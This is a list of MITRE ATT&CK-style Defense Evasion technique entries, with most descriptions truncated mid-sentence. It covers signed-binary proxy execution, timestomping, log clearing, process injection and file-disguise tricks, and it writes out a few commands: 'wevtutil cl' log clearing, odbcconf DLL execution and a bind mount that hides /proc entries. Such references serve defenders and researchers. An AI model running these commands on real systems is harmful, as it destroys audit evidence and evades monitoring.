+──────────────────────────────────────────────────
+
+TECHNIQUE: System Binary Proxy Execution
+TECHNIQUE ID: T1218
+TACTIC: Defense Evasion
+PLATFORMS: Windows, Linux, macOS
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands. Similarly, on Linux systems adversaries may abuse trusted binaries such as <code>split</code> to proxy 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Timestomp
+TECHNIQUE ID: T1070.006
+TACTIC: Defense Evasion
+PLATFORMS: ESXi, Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files. In Windows systems, both the `$STANDARD_INFORMATION` (`$SI`) and `$FILE_NAME` (`$FN`) attributes record times in a Master File Table (MFT) file. `$SI` (dates/time stamps) is displayed to the end user, including in the File System view, while `$FN` is dealt with by the kernel. Modifying the `$SI` attribute is the most common method of timestomping because it can be modified at the user level u
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Reflective Code Loading
+TECHNIQUE ID: T1620
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk (e.g., [Shared Modules](https://attack.mitre.org/techniques/T1129)). Reflectively loaded payloads may be compiled binaries, anonymous files (only present in RAM), or just snubs of fileless executable code (ex: position-independent shellcode). For example, the `Assembly.Load()` method executed by [PowerShell](https://attack.mitre.org/techniques/T1059/001) may be abused to load raw code into the running process. Refle
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Mutual Exclusion
+TECHNIQUE ID: T1480.002
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may constrain execution or actions based on the presence of a mutex associated with malware. A mutex is a locking mechanism used to synchronize access to a resource. Only one thread or process can acquire a mutex at a given time. While local mutexes only exist within a given process, allowing multiple threads to synchronize access to a resource, system mutexes can be used to synchronize the activities of multiple processes. By creating a unique system mutex associated with a particular malware, adversaries can verify whether or not a system has already been compromised. In Linux environments, malware may instead attempt to acquire a lock on a mutex file. If the malware is able to
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Ignore Process Interrupts
+TECHNIQUE ID: T1564.011
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off. These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes. Adversaries may invoke processes using `nohup`, [PowerShell](https://attack.mitre.org/techniques/T1059/001) `-ErrorAction SilentlyContinue`, or similar commands that may be immune to hangups. This may enable malicious commands and 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Time Based Checks
+TECHNIQUE ID: T1497.003
+TACTIC: Defense Evasion, Discovery
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may employ various time-based methods to detect virtualization and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. This may include enumerating time-based properties, such as uptime or the system clock. Adversaries may use calls like `GetTickCount` and `GetSystemTimeAsFileTime` to discover if they are operating within a virtual machine or sandbox, or may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: CMSTP
+TECHNIQUE ID: T1218.003
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections. Adversaries may supply CMSTP.exe with INF files infected with malicious commands. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010) / ”Squiblydoo”, CMSTP.exe may be abused to load and execute DLLs and/or COM scriptlets (SCT) from remote servers. This execution may also bypass AppLocker and other application control defenses sin
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Disable Windows Event Logging
+TECHNIQUE ID: T1562.002
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections. The EventLog service maintains event logs from various system components and applications. By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\Local Polic
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Control Panel
+TECHNIQUE ID: T1218.002
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings. Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function. For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. Control Panel items can be executed directly from the command line, programmatically via an application pro
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Network Address Translation Traversal
+TECHNIQUE ID: T1599.001
+TACTIC: Defense Evasion
+PLATFORMS: Network Devices
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may bridge network boundaries by modifying a network device’s Network Address Translation (NAT) configuration. Malicious modifications to NAT may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks. Network devices such as routers and firewalls that connect multiple networks together may implement NAT during the process of passing packets between networks. When performing NAT, the network device will rewrite the source and/or destination addresses of the IP address header. Some network designs require NAT for the packets to cross the border device. A typical example of this is environments where internal networks ma
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Overwrite Process Arguments
+TECHNIQUE ID: T1036.011
+TACTIC: Defense Evasion
+PLATFORMS: Linux
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may modify a process's in-memory arguments to change its name in order to appear as a legitimate or benign process. On Linux, the operating system stores command-line arguments in the process’s stack and passes them to the `main()` function as the `argv` array. The first element, `argv[0]`, typically contains the process name or path - by default, the command used to actually start the process (e.g., `cat /etc/passwd`). By default, the Linux `/proc` filesystem uses this value to represent the process name. The `/proc/<PID>/cmdline` file reflects the contents of this memory, and tools like `ps` use it to display process information. Since arguments are stored in user-space memory 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Use Alternate Authentication Material
+TECHNIQUE ID: T1550
+TACTIC: Defense Evasion, Lateral Movement
+PLATFORMS: Windows, SaaS, IaaS, Containers, Identity Provider, Office Suite, Linux
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls. Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation proces
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Disable or Modify System Firewall
+TECHNIQUE ID: T1562.004
+TACTIC: Defense Evasion
+PLATFORMS: ESXi, Linux, macOS, Network Devices, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel. Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard P
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: SIP and Trust Provider Hijacking
+TECHNIQUE ID: T1553.003
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may tamper with SIP and trust provider components to mislead the operating system and application control tools when conducting signature validation checks. In user mode, Windows Authenticode digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function, which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. Because of the varying executable fi
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Electron Applications
+TECHNIQUE ID: T1218.015
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams. Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS. The Chromium engine is used to display web content and Node.js runs the backend code. Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework. For example, the abuse of `t
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Disable or Modify Linux Audit System
+TECHNIQUE ID: T1562.012
+TACTIC: Defense Evasion
+PLATFORMS: Linux
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may disable or modify the Linux audit system to hide malicious activity and avoid detection. Linux admins use the Linux Audit system to track security-relevant information on a system. The Linux Audit system operates at the kernel-level and maintains event logs on application and system activity such as process, network, file, and login events based on pre-configured rules. Often referred to as `auditd`, this is the name of the daemon used to write events to disk and is governed by the parameters set in the `audit.conf` configuration file. Two primary ways to configure the log generation rules are through the command line `auditctl` utility and the file `/etc/audit/audit.rules`, 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Rogue Domain Controller
+TECHNIQUE ID: T1207
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may register a rogue Domain Controller to enable manipulation of Active Directory data. DCShadow may be used to create a rogue Domain Controller (DC). DCShadow is a method of manipulating Active Directory (AD) data, including objects and schemas, by registering (or reusing an inactive registration) and simulating the behavior of a DC. Once registered, a rogue DC may be able to inject and replicate changes into AD infrastructure for any domain object, including credentials and keys. Registering a rogue DC involves creating a new server and nTDSDSA objects in the Configuration partition of the AD schema, which requires Administrator privileges (either Domain or local to the DC) or 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Code Signing Policy Modification
+TECHNIQUE ID: T1553.006
+TACTIC: Defense Evasion
+PLATFORMS: Windows, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may modify code signing policies to enable execution of unsigned or self-signed code. Code signing provides a level of authenticity on a program from a developer and a guarantee that the program has not been tampered with. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on an operating system. Some of these security controls may be enabled by default, such as Driver Signature Enforcement (DSE) on Windows or System Integrity Protection (SIP) on macOS. Other such controls may be disabled by default but are configurable through application controls, such as only allowing signed Dynamic-Link Libraries (DLLs) to execute on a syste
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Deploy Container
+TECHNIQUE ID: T1610
+TACTIC: Defense Evasion, Execution
+PLATFORMS: Containers
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. Containers can be deplo
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Modify Registry
+TECHNIQUE ID: T1112
+TACTIC: Defense Evasion, Persistence
+PLATFORMS: Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may interact with the Windows Registry as part of a variety of other techniques to aid in defense evasion, persistence, and execution. Access to specific areas of the Registry depends on account permissions, with some keys requiring administrator-level access. The built-in Windows command-line utility [Reg](https://attack.mitre.org/software/S0075) may be used for local or remote Registry modification. Other tools, such as remote access tools, may also contain functionality to interact with the Registry through the Windows API. The Registry may be modified in order to hide configuration information or malicious payloads via [Obfuscated Files or Information](https://attack.mitre.or
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Unused/Unsupported Cloud Regions
+TECHNIQUE ID: T1535
+TACTIC: Defense Evasion
+PLATFORMS: IaaS
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure. Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected. A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Bind Mounts
+TECHNIQUE ID: T1564.013
+TACTIC: Defense Evasion
+PLATFORMS: Linux
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse bind mounts on file structures to hide their activity and artifacts from native utilities. A bind mount maps a directory or file from one location on the filesystem to another, similar to a shortcut on Windows. It’s commonly used to provide access to specific files or directories across different environments, such as inside containers or chroot environments, and requires sudo access. Adversaries may use bind mounts to map either an empty directory or a benign `/proc` directory to a malicious process’s `/proc` directory. Using the commands `mount –o bind /proc/benign-process /proc/malicious-process` (or `mount –B`), the malicious process's `/proc` directory is overlayed
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Binary Padding
+TECHNIQUE ID: T1027.001
+TACTIC: Defense Evasion
+PLATFORMS: Linux, Windows, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures. The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware. Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are no
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Group Policy Modification
+TECHNIQUE ID: T1484.001
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\`. Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain. 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Default Accounts
+TECHNIQUE ID: T1078.001
+TACTIC: Defense Evasion, Persistence, Privilege Escalation, Initial Access
+PLATFORMS: Windows, SaaS, IaaS, Linux, macOS, Containers, Network Devices, Office Suite, Identity Provider, ESXi
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes. Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are in
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Clear Windows Event Logs
+TECHNIQUE ID: T1070.001
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit. With administrator privileges, the event logs can be cleared with the following utility commands: * <code>wevtutil cl system</code> * <code>wevtutil cl application</code> * <code>wevtutil cl security</code> These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, advers
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: File and Directory Permissions Modification
+TECHNIQUE ID: T1222
+TACTIC: Defense Evasion
+PLATFORMS: ESXi, Linux, macOS, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files. File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.). Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory’s existing permissions. This may enable malicious activity such as modifyin
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Junk Code Insertion
+TECHNIQUE ID: T1027.016
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use junk code / dead code to obfuscate a malware’s functionality. Junk code is code that either does not execute, or if it does execute, does not change the functionality of the code. Junk code makes analysis more difficult and time-consuming, as the analyst steps through non-functional code instead of analyzing the main code. It also may hinder detections that rely on static code analysis due to the use of benign functionality, especially when combined with [Compression](https://attack.mitre.org/techniques/T1027/015) or [Software Packing](https://attack.mitre.org/techniques/T1027/002). No-Operation (NOP) instructions are an example of dead code commonly used in x86 assembly 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Create Process with Token
+TECHNIQUE ID: T1134.002
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>. Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Odbcconf
+TECHNIQUE ID: T1218.008
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. The Odbcconf.exe binary may be digitally signed by Microsoft. Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to [Regsvr32](https://attack.mitre.org/techniques/T1218/010), odbcconf.exe has a <code>REGSVR</code> flag that can be misused to execute DLLs (ex: <code>odbcconf.exe /S /A &lbrace;REGSVR "C:\Users\Public\file.dll"&rbrace;</code>).
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Process Doppelgänging
+TECHNIQUE ID: T1055.013
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. Windows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. To avoid corruption, TxF perfor
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Delete Cloud Instance
+TECHNIQUE ID: T1578.003
+TACTIC: Defense Evasion
+PLATFORMS: IaaS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence. Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable. An adversary may also [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and later terminate the instance after achieving their objectives.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Indicator Blocking
+TECHNIQUE ID: T1562.006
+TACTIC: Defense Evasion
+PLATFORMS: Windows, macOS, Linux, ESXi
+SUB-TECHNIQUE: Yes
+DESCRIPTION: An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETW), by tampering settings that control the collection and flow of event telemetry. These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1059/001) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047). For example, adversaries may modify the `File` value in <code>HKEY_LOCAL_MACHINE\S
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Extended Attributes
+TECHNIQUE ID: T1564.014
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse extended attributes (xattrs) on macOS and Linux to hide their malicious data in order to evade detection. Extended attributes are key-value pairs of file and directory metadata used by both macOS and Linux. They are not visible through standard tools like `Finder`, `ls`, or `cat` and require utilities such as `xattr` (macOS) or `getfattr` (Linux) for inspection. Operating systems and applications use xattrs for tagging, integrity checks, and access control. On Linux, xattrs are organized into namespaces such as `user.` (user permissions), `trusted.` (root permissions), `security.`, and `system.`, each with specific permissions. On macOS, xattrs are flat strings without 
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Disable or Modify Cloud Firewall
+TECHNIQUE ID: T1562.007
+TACTIC: Defense Evasion
+PLATFORMS: IaaS
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in [Disable or Modify System Firewall](https://attack.mitre.org/techniques/T1562/004). Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary with appropriate permissions may introduce new firewall rules or policies to allow access into a victim cloud environment and/or move laterally from the cloud control plane to the data plane. For example, an adversary may us
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Right-to-Left Override
+TECHNIQUE ID: T1036.002
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse the right-to-left override (RTLO or RLO) character (U+202E) to disguise a string and/or file name to make it appear benign. RTLO is a non-printing Unicode character that causes the text that follows it to be displayed in reverse. For example, a Windows screensaver executable named <code>March 25 \u202Excod.scr</code> will display as <code>March 25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\u202Egnp.js</code> will be displayed as <code>photo_high_resj.png</code>. Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type. A common use of this technique is with [Spearphishing Attachment](ht
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: SVG Smuggling
+TECHNIQUE ID: T1027.017
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign SVG files. SVGs, or Scalable Vector Graphics, are vector-based image files constructed using XML. As such, they can legitimately include `<script>` tags that enable adversaries to include malicious JavaScript payloads. However, SVGs may appear less suspicious to users than other types of executable files, as they are often treated as image files. SVG smuggling can take a number of forms. For example, threat actors may include content that: * Assembles malicious payloads * Downloads malicious payloads * Redirects users to malicious websites * Displays interactive content to user
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Indicator Removal
+TECHNIQUE ID: T1070
+TACTIC: Defense Evasion
+PLATFORMS: Containers, ESXi, Linux, macOS, Network Devices, Office Suite, Windows
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform. Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compr
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Pass the Ticket
+TECHNIQUE ID: T1550.003
+TACTIC: Defense Evasion, Lateral Movement
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may “pass the ticket” using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system. When preforming PtT, valid Kerberos tickets for [Valid Accounts](https://attack.mitre.org/techniques/T1078) are captured by [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows f
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Masquerade Task or Service
+TECHNIQUE ID: T1036.004
+TACTIC: Defense Evasion
+PLATFORMS: Linux, macOS, Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones. Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Asynchronous Procedure Call
+TECHNIQUE ID: T1055.004
+TACTIC: Defense Evasion, Privilege Escalation
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. APC injection is commonly performed by attaching malicious code to the APC Queue of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Plist File Modification
+TECHNIQUE ID: T1647
+TACTIC: Defense Evasion
+PLATFORMS: macOS
+SUB-TECHNIQUE: No
+DESCRIPTION: Adversaries may modify property list files (plist files) to enable other malicious activity, while also potentially evading and bypassing system defenses. macOS applications use plist files, such as the <code>info.plist</code> file, to store properties and configuration settings that inform the operating system how to handle the application at runtime. Plist files are structured metadata in key-value pairs formatted in XML based on Apple's Core Foundation DTD. Plist files can be saved in text or binary format. Adversaries can modify key-value pairs in plist files to influence system behaviors, such as hiding the execution of an application (i.e. [Hidden Window](https://attack.mitre.org/techn
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: JamPlus
+TECHNIQUE ID: T1127.003
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may use `JamPlus` to proxy the execution of a malicious script. `JamPlus` is a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio. Adversaries may abuse the `JamPlus` build utility to execute malicious scripts via a `.jam` file, which describes the build process and required dependencies. Because the malicious script is executed from a reputable developer tool, it may subvert application control security systems such as Smart App Control.
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Mark-of-the-Web Bypass
+TECHNIQUE ID: T1553.005
+TACTIC: Defense Evasion
+PLATFORMS: Windows
+SUB-TECHNIQUE: Yes
+DESCRIPTION: Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW. Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn
+
+──────────────────────────────────────────────────
+
+TECHNIQUE: Disable Crypto Hardware
+TECHNIQUE ID: T1600.002
+TACTIC: Defense Evasion
+PLATFORMS: Network Devices
+SUB-TECHNIQUE: Yes
